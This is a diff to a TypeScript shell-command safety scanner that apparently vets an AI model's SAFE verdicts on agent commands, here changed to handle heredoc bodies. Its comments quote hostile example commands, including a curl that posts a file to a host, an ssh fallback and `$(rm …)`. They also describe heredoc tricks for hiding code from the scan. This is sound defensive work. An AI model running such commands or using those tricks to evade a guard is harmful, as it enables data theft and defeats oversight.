@@ -1609,7 +1609,14 @@ const SEND_DATA_FLAGS: Record<string, true> = {
 };
 
 export function commandHasOutboundNetwork(command: string): boolean {
-	const normalized = command.replace(/\\\r?\n/gu, "");
+	// A document that mentions `wget` is not a fetch: heredoc bodies come off
+	// the raw command first, and an executed one is scanned as its own command.
+	// An unquoted body's `$(curl …)` does run at write time, but this scan reads
+	// segment LEADS and `$(curl …)` is not a lead in any position — `echo
+	// $(curl -d @x https://x)` is invisible to it with no heredoc in sight
+	// (issue #59). Handing it expanded bodies would buy nothing here and would
+	// put the documentation false positive back.
+	const normalized = withoutWrittenHeredocBodies(command).replace(/\\\r?\n/gu, "");
 	for (const text of splitTopLevelCommands(normalized)) {
 		// `||` passes splitTopLevelCommands unsplit, so the fallback half of
 		// `false || ssh host cat` would be invisible here; split it locally.
@@ -1677,7 +1684,9 @@ function writeTargetOutsideCwd(target: string, cwd: string): boolean {
 	return true;
 }
 
-/** Quoted spans are arguments and heredoc text, not redirections; drop them. */
+/** Quoted spans are arguments, not redirections; drop them. Heredoc BODIES
+ *  are not quoted spans (only the delimiter is), so splitHeredocs takes them
+ *  off the command before this runs. */
 function stripQuotedSpans(text: string): string {
 	let out = "";
 	let quote: "'" | '"' | undefined;
@@ -1727,7 +1736,10 @@ export function checkWriteScopeConsistency(judgement: Judgement, command: string
 	if (judgement.verdict !== "SAFE") return judgement;
 	const text = `${judgement.analysis ?? ""}\n${judgement.reason}`;
 	if (!WRITE_CONFINED_RE.test(text) && WRITE_DISCUSSED_RE.test(text)) return judgement;
-	for (const top of splitTopLevelCommands(command.replace(/\\\r?\n/gu, ""))) {
+	// A heredoc body written straight to a file is stdin data: `cat > notes.md
+	// <<'EOF'` writes notes.md, not whatever absolute path the prose inside it
+	// names. Every other heredoc keeps its body under this scan.
+	for (const top of splitTopLevelCommands(withoutWrittenHeredocBodies(command).replace(/\\\r?\n/gu, ""))) {
 		const bare = stripQuotedSpans(top);
 		for (const targetRe of WRITE_TARGET_RES) {
 			for (const match of bare.matchAll(targetRe)) {
@@ -2507,20 +2519,269 @@ function interpretersInSegment(segment: string[], rawStage: string): Array<{ ver
 	return hasScriptOperand ? [] : [{ verb, codeText: null }];
 }
 
+/**
+ * Heredoc bodies written straight to a file, removed before anything tokenizes
+ * the command.
+ *
+ * The bug: a body is stdin DATA, but every scan here tokenizes the whole
+ * command text, so a body's words read as a command line. `cat > f.ts <<'EOF'`
+ * writing `if (dd < 30) {` flagged `dd` — the tokenizer splits on `(` and
+ * treats `<` as a redirect, so the body produced a segment whose verb was a
+ * raw-disk-write binary, and a SAFE verdict on a plain file write hit the
+ * forced dialog.
+ *
+ * The scope of the fix is deliberately tiny, and that is the design. Two
+ * earlier cuts tried to decide, for any heredoc, whether the shell executes its
+ * body. Three review rounds returned twenty findings against them, because that
+ * decision is a shell parser: quoting, wrappers, `$x` owners, `{ … }` groups,
+ * comments, `awk -f -`, `xargs tee`, delimiter words, closer lines, multiple
+ * redirections to one stdin. Every miss was a SILENT BYPASS, because a wrong
+ * "this is data" answer deletes text the scans would have flagged.
+ *
+ * So this version does not decide anything. It matches ONE shape, spelled out
+ * in a single regex: a whole owner line that is nothing but `cat` or `tee`,
+ * optional flags, optional redirect targets, and a QUOTED heredoc delimiter at
+ * the end. Nothing else on the line, so no comment, expansion, substitution,
+ * pipe or second command can be hiding in it. Anything that fails to match —
+ * which is every shape those twenty findings used — keeps the behavior this
+ * file had before the fix: the body stays in the command text and is scanned
+ * as commands. That over-flags, and over-flagging is the direction this overlay
+ * is allowed to be wrong in.
+ */
+const HEREDOC_DATA_WRITE =
+	/(?:^|(?<=[\n;|&(){}]))[ \t]*(?:cat|tee)(?![^\s;|&(){}<>])(?:[ \t]+-{1,2}[A-Za-z][A-Za-z-]*)*(?:[ \t]*(?:\d?>>?[ \t]*)?[^\s;|&<>'"`$#-][^\s;|&<>'"`$#]*)*[ \t]*<<(-?)[ \t]*(['"])([A-Za-z_][A-Za-z0-9_.-]*)\2[ \t]*$/gmu;
+
+/**
+ * Every `<<` in `command` the shell would read as a heredoc operator, with
+ * the delimiter word after it. Delimiters are words: quote runs contribute
+ * their contents, a backslash contributes the escaped character, and a shell
+ * metacharacter or whitespace ends the word. Digit and punctuation starts
+ * are legal (`cat <<123`, `cat <<.OUT`). A word the walk cannot finish —
+ * one containing a command or parameter substitution like `$(printf OUT)`,
+ * which bash takes literally — comes back with `delim: null`, and the walk
+ * treats an unknown delimiter as covering to EOF, which only over-flags.
+ */
+function shadowOpeners(command: string): Array<{ index: number; bodyStart: number; tabs: boolean; delim: string | null }> {
+	const openers: Array<{ index: number; bodyStart: number; tabs: boolean; delim: string | null }> = [];
+	const re = /<<(-?)[ \t]*/gu;
+	re.lastIndex = 0;
+	let m: RegExpExecArray | null;
+	while ((m = re.exec(command)) !== null) {
+		let delim = "";
+		let unknown = false;
+		let i = m.index + m[0].length;
+		for (; i < command.length; i++) {
+			const ch = command[i];
+			if (ch === "\\" && i + 1 < command.length) {
+				delim += command[i + 1];
+				i++;
+				continue;
+			}
+			if (ch === "'" || ch === '"') {
+				const close = command.indexOf(ch, i + 1);
+				if (close === -1) break;
+				delim += command.slice(i + 1, close);
+				i = close;
+				continue;
+			}
+			if (/[\s;|&<>]/u.test(ch)) break;
+			if (ch === "(" || ch === ")" || ch === "$" || ch === "`") {
+				// Substitution syntax in the word: bash reads it literally,
+				// but this walk cannot know where the word ends, so no
+				// closer line can be trusted.
+				unknown = true;
+				break;
+			}
+			delim += ch;
+		}
+		const bodyStart = command.indexOf("\n", i) + 1;
+		if (bodyStart === 0) break;
+		openers.push({
+			index: m.index,
+			bodyStart,
+			tabs: m[1] === "-",
+			delim: unknown || delim === "" ? null : delim.replace(/[.*+?^${}()|[\]\\]/gu, "\\$&"),
+		});
+	}
+	return openers;
+}
+
+/**
+ * True when `at` sits inside the body of an earlier heredoc in `command`: an
+ * owner line found there is data to the outer cat or tee, never a command of
+ * its own. Every opener counts, not just the strip-shape owners, because an
+ * unquoted outer delimiter expands its body before the outer command reads
+ * it, so text the strip would delete can be live shell. The walk follows
+ * shell body order: openers on one line consume consecutive bodies, an
+ * opener inside a consumed body is data and opens nothing, and an
+ * unterminated body covers to EOF. This only ever over-flags, because the
+ * caller keeps the region under scan either way.
+ */
+function heredocShadowedAt(command: string, at: number): boolean {
+	const all = shadowOpeners(command);
+	let cursor = 0;
+	for (let i = 0; i < all.length; i++) {
+		const op = all[i];
+		if (op.bodyStart === 0) break;
+		if (op.bodyStart > at) return false;
+		if (op.index < cursor) continue;
+		// A closer is the whole delimiter line, exact; `<<-` strips leading
+		// tabs. Trailing whitespace disqualifies it here exactly as it does
+		// for stripping, or `OUT ` would end a body the shell keeps reading.
+		// Openers sharing a line consume consecutive bodies; a body with no
+		// closer covers to EOF, which only ever over-flags.
+		let edge = op.bodyStart;
+		for (let j = i; j < all.length && all[j].bodyStart === op.bodyStart; j++) {
+			const peer = all[j];
+			// An unknown delimiter covers everything to EOF.
+			if (peer.delim === null) return true;
+			const closer = new RegExp(`^${peer.tabs ? "\\t*" : ""}${peer.delim}$`, "mu").exec(command.slice(edge));
+			if (closer === null) return true;
+			const line = edge + closer.index;
+			const nl = command.indexOf("\n", line);
+			edge = nl === -1 ? command.length : nl + 1;
+		}
+		cursor = edge;
+		if (at < cursor) return true;
+	}
+	return false;
+}
+
+/**
+ * True when a quote opened before `at` and stays open there, so the shell
+ * reads everything in between as string text. Both quotes span newlines, a
+ * backslash outside quotes escapes the next character, and ANSI-C `$'...'`
+ * strings treat `\'` as an escaped quote where plain `'...'` would close.
+ * Nothing else matters. An apostrophe in unquoted prose opens a quote that
+ * never closes, which only ever blocks a strip that would have removed
+ * text — the over-flag direction.
+ */
+function openQuoteBefore(command: string, at: number): boolean {
+	let quote: "'" | '"' | undefined;
+	let ansi = false;
+	for (let i = 0; i < at; i++) {
+		const ch = command[i];
+		if (quote === "'") {
+			if (ch === "\\" && ansi) {
+				i++;
+				continue;
+			}
+			if (ch === "'") {
+				quote = undefined;
+				ansi = false;
+			}
+			continue;
+		}
+		if (quote === '"') {
+			if (ch === "\\") {
+				i++;
+				continue;
+			}
+			if (ch === '"') quote = undefined;
+			continue;
+		}
+		if (ch === "\\") {
+			i++;
+			continue;
+		}
+		if (ch === "'" || ch === '"') {
+			quote = ch;
+			ansi = ch === "'" && command[i - 1] === "$";
+		}
+	}
+	return quote !== undefined;
+}
+
+/**
+ * `command` with the body and closing line of every matching heredoc removed.
+ *
+ * Runs on the RAW command: normalizing backslash-newline first let a `safe\`
+ * line inside a body join the closing delimiter and delete the rest of the
+ * command. A body whose closer is missing ends the stripping, because then
+ * the parse cannot say where it ends and every later owner line sits inside
+ * that body.
+ */
+export function withoutWrittenHeredocBodies(command: string): string {
+	if (!command.includes("<<")) return command;
+	HEREDOC_DATA_WRITE.lastIndex = 0;
+	const kept: string[] = [];
+	let copied = 0;
+	let opener: RegExpExecArray | null;
+	while ((opener = HEREDOC_DATA_WRITE.exec(command)) !== null) {
+		// A physical newline ends a command only when the shell does not glue
+		// the lines: `bash -s \` + an owner line feeds the body to bash's
+		// stdin, where it runs as script text. And a `#` earlier on the line
+		// makes the whole owner a comment, so the lines after it are live
+		// commands, not body. Neither shape strips; both keep everything the
+		// regex would have deleted under scan. An escaped backslash before
+		// the newline also counts as glued, which only ever over-flags.
+		const lineStart = command.lastIndexOf("\n", opener.index - 1) + 1;
+		const glued = command[opener.index - 1] === "\n" && command[opener.index - 2] === "\\";
+		const commented = command.slice(lineStart, opener.index).includes("#");
+		const bodyStart = command.indexOf("\n", opener.index + opener[0].length);
+		if (bodyStart === -1) break;
+		const delimiter = opener[3].replace(/[.*+?^${}()|[\]\\]/gu, "\\$&");
+		// The closer is the WHOLE line, and only `<<-` strips leading tabs, so
+		// `  EOF` is body text for a plain `<<` exactly as the shell reads it.
+		const closer = new RegExp(`^${opener[1] === "-" ? "\\t*" : ""}${delimiter}$`, "mu")
+			.exec(command.slice(bodyStart + 1));
+		if (glued) {
+			// A glued owner opens a real heredoc only if its closer exists;
+			// with no closer the body runs to EOF, so every later owner line
+			// sits inside it and stripping ends, exactly like the normal
+			// path below. With a closer, scanning resumes after it so data
+			// lines inside the glued body never strip as if they were owners.
+			if (!closer) break;
+			const lineEnd = command.indexOf("\n", bodyStart + 1 + closer.index);
+			HEREDOC_DATA_WRITE.lastIndex = lineEnd === -1 ? command.length : lineEnd + 1;
+			continue;
+		}
+		if (commented || openQuoteBefore(command, opener.index)) {
+			// A comment opens nothing, so the lines after it are live
+			// commands; an owner inside a multi-line string is string text.
+			// Neither shape strips, and scanning resumes after the owner
+			// line for both.
+			continue;
+		}
+		// An owner-shaped line inside another heredoc's body is data to the
+		// outer cat or tee. With a QUOTED outer delimiter nothing in the body
+		// runs, but an unquoted one expands before the outer command reads
+		// it, so no strip inside another body can call its payload inert.
+		// Over-flag: the whole region stays under scan.
+		if (heredocShadowedAt(command, opener.index)) continue;
+		// No closer means the parse cannot say where the body ends, so every
+		// later owner line sits inside this body and nothing after it strips.
+		if (!closer) break;
+		const bodyEnd = bodyStart + 1 + closer.index;
+		const lineEnd = command.indexOf("\n", bodyEnd);
+		const next = lineEnd === -1 ? command.length : lineEnd + 1;
+		kept.push(command.slice(copied, bodyStart + 1));
+		copied = next;
+		HEREDOC_DATA_WRITE.lastIndex = next;
+	}
+	if (kept.length === 0) return command;
+	kept.push(command.slice(copied));
+	return kept.join("");
+}
+
 /** Body of the first heredoc redirection in `text`, or null when the text
  *  carries none. The body is everything after the opener line up to the
  *  closing delimiter line; an unterminated heredoc runs to the end, which is
  *  what the shell would read. */
 function heredocBody(text: string): string | null {
-	const opener = /<<-?[ \t]*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\1/u.exec(text);
+	const opener = /<<(-?)[ \t]*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\2/u.exec(text);
 	if (!opener) return null;
 	const start = text.indexOf("\n", opener.index);
 	if (start === -1) return null;
 	const tail = text.slice(start + 1);
-	const closer = new RegExp(`^[ \t]*${opener[2]}[ \t]*$`, "mu").exec(tail);
+	// The closer is the whole line, and only `<<-` strips leading tabs. Accepting
+	// an indented delimiter ended the payload early, so an interpreter body could
+	// hide its `os.system` behind a `  EOF` line and read as plain code. Trailing
+	// whitespace disqualifies a closer too: the shell keeps reading, so a body
+	// may hide its second act behind an `EOF ` line.
+	const closer = new RegExp(`^${opener[1] === "-" ? "\\t*" : ""}${opener[3]}$`, "mu").exec(tail);
 	return closer ? tail.slice(0, closer.index) : tail;
 }
-
 
 /**
  * Split a command into pipe stages, quote-aware. `tokenizeShellSegments` cannot
@@ -2900,7 +3161,13 @@ export function matchModerateRiskTokens(command: string, cwd?: string): string[]
 	// POSIX deletes a backslash-newline pair before word splitting; the
 	// tokenizer keeps it, which would split `rm` into r/NL/m. Remove the pairs
 	// for MATCHING purposes so the splice reads as one verb.
-	const normalized = command.replace(/\\\r?\n/gu, "");
+	// A body written straight to a file comes off the RAW command first: it is
+	// stdin data, and leaving it inline let its words read as a command line.
+	// Every other heredoc keeps its body, and its words keep being scanned.
+	// POSIX deletes a backslash-newline pair before word splitting; the
+	// tokenizer keeps it, which would split `rm` into r/NL/m. Remove the pairs
+	// for MATCHING purposes so the splice reads as one verb.
+	const normalized = withoutWrittenHeredocBodies(command).replace(/\\\r?\n/gu, "");
 	const segments = tokenizeShellSegments(normalized);
 	const flags = new Set<string>();
 
@@ -3056,22 +3323,30 @@ export function matchModerateRiskTokens(command: string, cwd?: string): string[]
 	// actually CONTAINS — collect $(...) spans (plus an unterminated tail) and
 	// backtick spans, and flag risk verbs only inside those spans. Text outside
 	// (`grep $(git rev-parse HEAD) file`) stays on the graceful path.
-	if (/\$\(|`/u.test(normalized)) {
-		const spans: string[] = [];
-		for (const m of normalized.matchAll(/\$\(([^)]*)\)/gu)) spans.push(m[1]);
-		const dollarTail = /\$\(([^)]*)$/u.exec(normalized);
-		if (dollarTail) spans.push(dollarTail[1]);
-		for (const m of normalized.matchAll(/`([^`]*)`/gu)) spans.push(m[1]);
-		const backtickTail = /`([^`]*)$/u.exec(normalized);
-		if (backtickTail) spans.push(backtickTail[1]);
-		for (const span of spans) {
-			for (const token of MODERATE_RISK_TOKENS) {
-				if (new RegExp(`\\b${token}\\b`, "iu").test(span)) flags.add(token);
-			}
-			if (/^mkfs\b|^mkfs\./iu.test(span.trim())) flags.add("mkfs");
-		}
-	}
+	addSubstitutionFlags(normalized, flags);
 	return [...flags].sort();
+}
+
+/** Risk verbs inside `$(…)` and backtick spans of `text`. Substitution is
+ *  outside the tokenizer's scope, so a verb in one cannot be cleared by
+ *  position: `echo "$(rm important)"` would otherwise auto-run. Narrowed to
+ *  what a span actually CONTAINS, so `grep $(git rev-parse HEAD) file` stays
+ *  on the graceful path. */
+function addSubstitutionFlags(text: string, flags: Set<string>): void {
+	if (!/\$\(|`/u.test(text)) return;
+	const spans: string[] = [];
+	for (const m of text.matchAll(/\$\(([^)]*)\)/gu)) spans.push(m[1]);
+	const dollarTail = /\$\(([^)]*)$/u.exec(text);
+	if (dollarTail) spans.push(dollarTail[1]);
+	for (const m of text.matchAll(/`([^`]*)`/gu)) spans.push(m[1]);
+	const backtickTail = /`([^`]*)$/u.exec(text);
+	if (backtickTail) spans.push(backtickTail[1]);
+	for (const span of spans) {
+		for (const token of MODERATE_RISK_TOKENS) {
+			if (new RegExp(`\\b${token}\\b`, "iu").test(span)) flags.add(token);
+		}
+		if (/^mkfs\b|^mkfs\./iu.test(span.trim())) flags.add("mkfs");
+	}
 }
 
 /**
